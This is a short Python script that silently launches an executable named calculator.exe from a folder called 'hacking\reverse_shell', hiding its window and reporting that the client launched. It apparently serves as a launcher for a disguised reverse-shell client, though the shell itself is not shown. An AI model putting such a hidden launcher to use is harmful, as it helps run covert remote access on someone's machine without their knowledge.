import subprocess
try:
    subprocess.Popen(
        ["C:\\Users\\casti\\Desktop\\hacking\\reverse_shell\\calculator.exe"],
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    print("Client launched successfully")
except Exception as e:
    print(e)